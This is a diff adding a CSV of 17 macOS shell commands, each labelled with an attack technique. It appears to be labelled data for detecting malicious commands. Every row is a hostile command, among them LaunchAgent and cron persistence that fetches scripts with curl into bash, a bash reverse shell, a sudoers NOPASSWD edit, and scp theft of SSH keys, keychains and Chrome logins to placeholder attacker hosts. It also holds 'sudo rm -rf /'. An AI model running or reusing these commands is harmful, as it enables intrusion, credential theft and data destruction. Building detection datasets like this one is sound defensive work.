@@ -1,0 +1,18 @@
+"cmd","description"
+"launchctl load -w /Library/LaunchDaemons/com.malicious.daemon.plist",Persistence via LaunchDaemons
+"launchctl load -w /System/Library/LaunchDaemons/com.hidden.daemon.plist",Persistence via LaunchDaemons
+"echo '<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<dict>\n\t<key>Label</key>\n\t<string>com.hidden.agent</string>\n\t<key>ProgramArguments</key>\n\t<array>\n\t\t<string>/usr/bin/curl -fsSL http://malicious-url.com/payload.sh | bash</string>\n\t</array>\n\t<key>KeepAlive</key>\n\t<true/>\n</dict>\n</plist>' > ~/Library/LaunchAgents/com.hidden.agent.plist; chmod 644 ~/Library/LaunchAgents/com.hidden.agent.plist",Hidden Persistence in User LaunchAgents
+"echo 'ALL ALL=(ALL:ALL) NOPASSWD:ALL' | sudo tee -a /etc/sudoers",Privilege Escalation by Modifying Sudoers
+"bash -i >& /dev/tcp/attacker.com/4444 0>&1",Backdoor via Bash Shell
+"scp ~/Documents/passwords.txt attacker@malicious-server.com:/stolen_data/passwords.txt",Data Exfiltration via SCP
+"curl -fsSL http://malicious-url.com/beacon.sh | bash",Command and Control Beacon
+"rm -rf ~/Documents/*",Destructive Operations
+"sudo rm -rf /",Destructive Operations
+"sudo tcpdump -i en0 -w /tmp/network_capture.pcap",Network Sniffing
+"find ~/Library/Keychains -type f -exec scp {} attacker@malicious-server.com:/stolen_data/keychains/ \\;",Exfiltration of Keychain Files
+"scp ~/.ssh/id_rsa attacker@malicious-server.com:/stolen_data/ssh_key",Exfiltration of SSH Keys
+"curl -o /tmp/malware.sh http://malicious-url.com/malware.sh && chmod +x /tmp/malware.sh && /tmp/malware.sh",Malware Download and Execution
+"sudo /usr/libexec/ApplicationFirewall/socketfilterfw --setglobalstate off",Disable Firewall
+"(crontab -l 2>/dev/null; echo \"@reboot curl -fsSL http://malicious-url.com/payload.sh | bash\") | crontab -",Hidden Cron Jobs
+"cp ~/Library/Application\\ Support/Google/Chrome/Default/Login\\ Data /tmp && scp /tmp/Login\\ Data attacker@malicious-server.com:/stolen_data/",Stealing Browser Data
+"screencapture -x /tmp/screenshot.jpg && scp /tmp/screenshot.jpg attacker@malicious-server.com:/stolen_data/",Screen Capture
